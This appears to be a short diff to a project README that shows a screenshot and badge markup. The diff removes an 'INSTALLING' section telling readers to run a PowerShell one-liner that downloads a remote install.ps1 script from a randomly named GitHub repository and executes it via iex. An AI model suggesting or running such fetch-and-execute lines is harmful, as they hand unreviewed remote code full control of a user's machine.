@@ -12,16 +12,6 @@
 
 ![NVIDIA_Overlay_EIpvi6zRb6](https://github.com/user-attachments/assets/9f131bb2-aa6c-4e95-ac20-a0eae0e0e2e8)
 
-***
-
-<div class=badges align="center">
-   <img src="INSTALLING" width="60%"/>
-   <br><br><br><br>
-
- Run this in Pwsh
-```
-iex ((New-Object System.Net.WebClient).DownloadString('https://github.com/Regling/glowing-octo-parakeet/blob/main/install.ps1'))
-```
 
 ***
 <div class=badges align="center">
